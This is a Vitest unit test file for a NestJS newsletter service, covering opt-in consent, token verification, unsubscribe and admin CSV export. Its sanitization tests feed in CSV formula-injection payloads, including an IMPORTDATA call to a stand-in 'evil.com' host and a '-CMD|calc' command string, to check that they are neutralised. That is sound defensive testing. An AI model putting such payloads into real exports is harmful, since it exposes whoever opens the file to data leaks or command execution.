import { describe, it, expect, vi, beforeEach } from 'vitest';
import { Test, TestingModule } from '@nestjs/testing';
import { BadRequestException, NotFoundException, HttpException } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { NewsletterService, sanitizeCsvField } from './newsletter.service';
import { PrismaService } from '../../prisma/prisma.service';
import { NotificationsService } from '../notifications/notifications.service';
import {
  NewsletterSubscriberStatus,
  NewsletterConsentEventType,
} from '../../generated/prisma';

describe('NewsletterService (Phase 15.6)', () => {
  let service: NewsletterService;
  let prisma: any;
  let notifications: any;
  let config: any;

  beforeEach(async () => {
    prisma = {
      newsletterSubscriber: {
        findUnique: vi.fn(),
        findMany: vi.fn(),
        count: vi.fn(),
        groupBy: vi.fn(),
        create: vi.fn(),
        update: vi.fn(),
      },
      newsletterVerificationToken: {
        findUnique: vi.fn(),
        create: vi.fn(),
        update: vi.fn(),
        updateMany: vi.fn(),
      },
      newsletterConsentEvent: {
        create: vi.fn(),
        findMany: vi.fn(),
      },
      $transaction: vi.fn(async (cb) => cb(prisma)),
    };

    notifications = {
      sendNewsletterVerificationEmail: vi.fn().mockResolvedValue({
        success: true,
        messageId: 'msg-test',
        deliveryStatus: 'SIMULATED',
      }),
      isEmailProviderConfigured: vi.fn().mockReturnValue(false),
    };

    config = {
      get: vi.fn((key: string, defaultValue?: any) => {
        if (key === 'FRONTEND_URL') return 'http://localhost:3000';
        if (key === 'NEWSLETTER_VERIFICATION_EXPIRY_HOURS') return 24;
        return defaultValue;
      }),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        NewsletterService,
        { provide: PrismaService, useValue: prisma },
        { provide: NotificationsService, useValue: notifications },
        { provide: ConfigService, useValue: config },
      ],
    }).compile();

    service = module.get<NewsletterService>(NewsletterService);
  });

  describe('CSV Sanitization & Formula Injection Protection', () => {
    it('sanitizes formula injection characters (=, +, -, @, \\t, \\r)', () => {
      expect(sanitizeCsvField('=SUM(A1:A10)')).toBe(`"'=SUM(A1:A10)"`);
      expect(sanitizeCsvField('+123456')).toBe(`"'+123456"`);
      expect(sanitizeCsvField('-CMD|calc')).toBe(`"'-CMD|calc"`);
      expect(sanitizeCsvField('@IMPORTDATA("http://evil.com")')).toBe(`"'@IMPORTDATA(""http://evil.com"")"`);
      expect(sanitizeCsvField('\tTAB_VAL')).toBe(`"'\tTAB_VAL"`);
      expect(sanitizeCsvField('\rCR_VAL')).toBe(`"'\rCR_VAL"`);
    });

    it('escapes internal quotes properly and wraps normal values in quotes', () => {
      expect(sanitizeCsvField('Atlas CR Book 80 "Deluxe"')).toBe(`"Atlas CR Book 80 ""Deluxe"""`);
      expect(sanitizeCsvField('user@example.com')).toBe(`"user@example.com"`);
      expect(sanitizeCsvField(null)).toBe('""');
      expect(sanitizeCsvField(undefined)).toBe('""');
    });
  });

  describe('Email Normalization', () => {
    it('lowercases and trims email addresses', () => {
      expect(service.normalizeEmail('  Customer.DSL@Example.COM  ')).toBe('customer.dsl@example.com');
    });

    it('masks email addresses securely for logging and public display', () => {
      expect(service.maskEmail('saman@dsl.lk')).toBe('s***n@dsl.lk');
      expect(service.maskEmail('a@dsl.lk')).toBe('a***@dsl.lk');
    });
  });

  describe('Subscription Process (Double Opt-In)', () => {
    it('rejects subscription if affirmative consent is missing or false', async () => {
      await expect(
        service.subscribe({
          email: 'test@example.com',
          consent: false as any,
        })
      ).rejects.toThrow(BadRequestException);
    });

    it('creates new subscriber in PENDING state and dispatches verification email', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue(null);
      prisma.newsletterSubscriber.create.mockResolvedValue({
        id: 'sub-1',
        email: 'newbie@example.com',
        status: NewsletterSubscriberStatus.PENDING,
      });

      const res = await service.subscribe({
        email: 'NewBie@Example.COM ',
        consent: true,
        source: 'WEBSITE_FOOTER',
      });

      expect(res.success).toBe(true);
      expect(prisma.newsletterSubscriber.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            email: 'newbie@example.com',
            status: NewsletterSubscriberStatus.PENDING,
            consentSource: 'WEBSITE_FOOTER',
          }),
        })
      );
      expect(prisma.newsletterVerificationToken.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            subscriberId: 'sub-1',
            tokenHash: expect.any(String),
          }),
        })
      );
      expect(prisma.newsletterConsentEvent.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            subscriberId: 'sub-1',
            eventType: NewsletterConsentEventType.CONSENT_GIVEN,
          }),
        })
      );
      expect(notifications.sendNewsletterVerificationEmail).toHaveBeenCalledWith(
        expect.objectContaining({
          email: 'newbie@example.com',
          verificationUrl: expect.stringContaining('/newsletter/verify?token='),
        })
      );
    });

    it('returns generic success without duplicate tokens if email is already VERIFIED', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-verified',
        email: 'already@example.com',
        status: NewsletterSubscriberStatus.VERIFIED,
      });

      const res = await service.subscribe({
        email: 'already@example.com',
        consent: true,
      });

      expect(res.success).toBe(true);
      expect(prisma.newsletterSubscriber.create).not.toHaveBeenCalled();
      expect(prisma.newsletterVerificationToken.create).not.toHaveBeenCalled();
    });

    it('handles resubscription for previously UNSUBSCRIBED user with fresh consent', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-unsub',
        email: 'resubscribe@example.com',
        status: NewsletterSubscriberStatus.UNSUBSCRIBED,
      });

      const res = await service.subscribe({
        email: 'resubscribe@example.com',
        consent: true,
        source: 'HOMEPAGE',
      });

      expect(res.success).toBe(true);
      expect(prisma.newsletterSubscriber.update).toHaveBeenCalledWith(
        expect.objectContaining({
          where: { id: 'sub-unsub' },
          data: expect.objectContaining({
            status: NewsletterSubscriberStatus.PENDING,
            consentSource: 'HOMEPAGE',
            unsubscribedAt: null,
          }),
        })
      );
      expect(prisma.newsletterConsentEvent.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            subscriberId: 'sub-unsub',
            eventType: NewsletterConsentEventType.RESUBSCRIPTION_REQUESTED,
          }),
        })
      );
    });

    it('handles notification dispatch error gracefully without rolling back subscription record', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue(null);
      prisma.newsletterSubscriber.create.mockResolvedValue({
        id: 'sub-err',
        email: 'err@example.com',
        status: NewsletterSubscriberStatus.PENDING,
      });
      notifications.sendNewsletterVerificationEmail.mockRejectedValue(new Error('SMTP unreachable'));

      const res = await service.subscribe({
        email: 'err@example.com',
        consent: true,
      });

      expect(res.success).toBe(true);
    });
  });

  describe('Verification Process', () => {
    it('rejects empty or whitespace-only verification tokens', async () => {
      await expect(service.verify('')).rejects.toThrow(BadRequestException);
      await expect(service.verify('   ')).rejects.toThrow(BadRequestException);
    });

    it('rejects invalid/nonexistent verification tokens', async () => {
      prisma.newsletterVerificationToken.findUnique.mockResolvedValue(null);

      await expect(service.verify('invalid-token')).rejects.toThrow(BadRequestException);
    });

    it('rejects already used verification tokens', async () => {
      prisma.newsletterVerificationToken.findUnique.mockResolvedValue({
        id: 'tok-used',
        usedAt: new Date(Date.now() - 3600000),
        expiresAt: new Date(Date.now() + 3600000),
        subscriber: { id: 'sub-1', email: 'test@dsl.lk' },
      });

      await expect(service.verify('used-token')).rejects.toThrow(
        'This verification link has already been used'
      );
    });

    it('rejects expired verification tokens', async () => {
      prisma.newsletterVerificationToken.findUnique.mockResolvedValue({
        id: 'tok-exp',
        usedAt: null,
        expiresAt: new Date(Date.now() - 1000), // expired 1s ago
        subscriber: { id: 'sub-1', email: 'test@dsl.lk' },
      });

      await expect(service.verify('expired-token')).rejects.toThrow(
        'This verification link has expired'
      );
    });

    it('successfully verifies subscriber atomically and updates status to VERIFIED', async () => {
      prisma.newsletterVerificationToken.findUnique.mockResolvedValue({
        id: 'tok-valid',
        usedAt: null,
        expiresAt: new Date(Date.now() + 86400000),
        subscriber: {
          id: 'sub-1',
          email: 'valid@dsl.lk',
          consentSource: 'WEBSITE_FOOTER',
          consentTextVersion: 'v1.0',
        },
      });

      const res = await service.verify('valid-token-secret');

      expect(res.success).toBe(true);
      expect(prisma.newsletterVerificationToken.update).toHaveBeenCalledWith(
        expect.objectContaining({
          where: { id: 'tok-valid' },
          data: expect.objectContaining({ usedAt: expect.any(Date) }),
        })
      );
      expect(prisma.newsletterSubscriber.update).toHaveBeenCalledWith(
        expect.objectContaining({
          where: { id: 'sub-1' },
          data: expect.objectContaining({
            status: NewsletterSubscriberStatus.VERIFIED,
            verifiedAt: expect.any(Date),
          }),
        })
      );
      expect(prisma.newsletterConsentEvent.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            subscriberId: 'sub-1',
            eventType: NewsletterConsentEventType.EMAIL_VERIFIED,
          }),
        })
      );
    });
  });

  describe('Resend Verification Flow', () => {
    it('enforces 60-second cooldown rate limit between verification resends', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-rate-limit',
        email: 'ratelimit@dsl.lk',
        status: NewsletterSubscriberStatus.PENDING,
        verificationTokens: [
          {
            id: 'tok-recent',
            createdAt: new Date(Date.now() - 30000), // created 30s ago
          },
        ],
      });

      await expect(
        service.resendVerification({ email: 'ratelimit@dsl.lk' })
      ).rejects.toThrow(HttpException);
    });

    it('resends verification successfully when cooldown has elapsed', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-ok',
        email: 'ok@dsl.lk',
        status: NewsletterSubscriberStatus.PENDING,
        verificationTokens: [
          {
            id: 'tok-old',
            createdAt: new Date(Date.now() - 120000), // created 2m ago
          },
        ],
      });

      const res = await service.resendVerification({ email: 'ok@dsl.lk' });

      expect(res.success).toBe(true);
      expect(prisma.newsletterVerificationToken.create).toHaveBeenCalled();
      expect(notifications.sendNewsletterVerificationEmail).toHaveBeenCalled();
    });
  });

  describe('Unsubscribe Flow', () => {
    it('returns unsubscribe info by token', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-1',
        email: 'subscriber@dsl.lk',
        status: NewsletterSubscriberStatus.VERIFIED,
      });

      const info = await service.getUnsubscribeInfo('valid-unsub-tok');
      expect(info.maskedEmail).toBe('s***r@dsl.lk');
      expect(info.isUnsubscribed).toBe(false);
    });

    it('rejects invalid unsubscribe token', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue(null);

      await expect(service.unsubscribe('invalid-token')).rejects.toThrow(NotFoundException);
    });

    it('unsubscribes verified subscriber and records consent event', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-1',
        email: 'subscriber@dsl.lk',
        status: NewsletterSubscriberStatus.VERIFIED,
        consentTextVersion: 'v1.0',
      });

      const res = await service.unsubscribe('valid-token');

      expect(res.success).toBe(true);
      expect(prisma.newsletterSubscriber.update).toHaveBeenCalledWith(
        expect.objectContaining({
          where: { id: 'sub-1' },
          data: expect.objectContaining({
            status: NewsletterSubscriberStatus.UNSUBSCRIBED,
            unsubscribedAt: expect.any(Date),
          }),
        })
      );
      expect(prisma.newsletterConsentEvent.create).toHaveBeenCalledWith(
        expect.objectContaining({
          data: expect.objectContaining({
            subscriberId: 'sub-1',
            eventType: NewsletterConsentEventType.UNSUBSCRIBED,
          }),
        })
      );
    });

    it('is idempotent when subscriber is already unsubscribed', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-1',
        email: 'already@dsl.lk',
        status: NewsletterSubscriberStatus.UNSUBSCRIBED,
      });

      const res = await service.unsubscribe('valid-token');

      expect(res.success).toBe(true);
      expect(prisma.newsletterSubscriber.update).not.toHaveBeenCalled();
      expect(prisma.newsletterConsentEvent.create).not.toHaveBeenCalled();
    });
  });

  describe('Admin Operations & CSV Export', () => {
    it('queries subscribers with pagination, search, and breakdown counts', async () => {
      prisma.newsletterSubscriber.findMany.mockResolvedValue([
        { id: 'sub-1', email: 'verified@dsl.lk', status: NewsletterSubscriberStatus.VERIFIED },
      ]);
      prisma.newsletterSubscriber.count.mockResolvedValue(1);
      prisma.newsletterSubscriber.groupBy.mockResolvedValue([
        { status: NewsletterSubscriberStatus.VERIFIED, _count: { _all: 1 } },
      ]);

      const res = await service.getAdminSubscribers({
        page: 1,
        limit: 10,
        status: 'ALL',
        search: 'dsl.lk',
      });

      expect(res.items.length).toBe(1);
      expect(res.pagination.totalItems).toBe(1);
      expect(res.counts.verified).toBe(1);
    });

    it('gets subscriber details without exposing sensitive token hashes', async () => {
      prisma.newsletterSubscriber.findUnique.mockResolvedValue({
        id: 'sub-1',
        email: 'user@dsl.lk',
        status: NewsletterSubscriberStatus.VERIFIED,
        unsubscribeToken: 'secret-unsub-tok',
        verificationTokens: [
          { id: 'tok-1', expiresAt: new Date(), usedAt: null, createdAt: new Date() },
        ],
        consentEvents: [],
      });

      const res = await service.getAdminSubscriberById('sub-1');

      expect(res.email).toBe('user@dsl.lk');
      expect((res as any).unsubscribeToken).toBeUndefined();
    });

    it('exports ONLY eligible VERIFIED and NOT unsubscribed subscribers to CSV with formula sanitization', async () => {
      const now = new Date('2026-11-06T10:00:00Z');
      prisma.newsletterSubscriber.findMany.mockResolvedValue([
        {
          email: '=evil@dsl.lk',
          status: NewsletterSubscriberStatus.VERIFIED,
          consentGivenAt: now,
          verifiedAt: now,
          consentSource: 'WEBSITE_FOOTER',
          consentTextVersion: 'v1.0',
        },
        {
          email: 'good@dsl.lk',
          status: NewsletterSubscriberStatus.VERIFIED,
          consentGivenAt: now,
          verifiedAt: now,
          consentSource: 'HOMEPAGE',
          consentTextVersion: 'v1.0',
        },
      ]);

      const csv = await service.exportEligibleSubscribersCsv();

      expect(csv).toContain('email,subscription_status,consent_given_at,verified_at,consent_source,consent_text_version');
      // Formula prefix protected with single quote
      expect(csv).toContain(`"'=evil@dsl.lk","VERIFIED"`);
      expect(csv).toContain(`"good@dsl.lk","VERIFIED"`);

      // Ensure findMany query filtered by VERIFIED and unsubscribedAt: null
      expect(prisma.newsletterSubscriber.findMany).toHaveBeenCalledWith(
        expect.objectContaining({
          where: expect.objectContaining({
            status: NewsletterSubscriberStatus.VERIFIED,
            unsubscribedAt: null,
          }),
        })
      );
    });
  });
});
